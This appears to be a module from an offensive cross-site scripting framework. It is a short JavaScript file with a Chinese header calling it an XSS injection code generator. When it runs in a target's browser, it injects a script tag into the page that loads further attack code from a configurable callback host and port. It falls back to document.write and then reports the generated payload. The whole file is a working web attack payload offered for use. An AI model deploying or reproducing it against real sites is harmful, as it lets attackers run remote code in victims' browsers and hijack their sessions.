// MODULE = {"desc": "XSS 注入代码生成器:浏览器执行时把 <script src> 注入当前页面,构建预览时直接产出注入代码", "category": "注入", "params": [["module", "要加载的反连模块名,默认 hello"], ["host", "反连地址,默认 127.0.0.1"], ["args", "反连模块参数 JSON(可选)"]]}
(function () {
  var m = _q("m", "{{module}}") || "hello";
  var host = _q("host", "{{host}}");
  var args = _q("args", "{{args}}");
  var qs = args ? "&a=" + encodeURIComponent(args) : "";
  var url = "http://" + host + ":{{config.port}}{{config.route_payload}}?m=" + m + qs;
  var tag = '<script src="' + url + '"><\/script>';
  try {
    var s = document.createElement("script");
    s.src = url;
    (document.body || document.documentElement).appendChild(s);
  } catch (e) {
    document.write(tag);
  }
  report({ type: "xss_payload", url: url, tag: tag });
})();
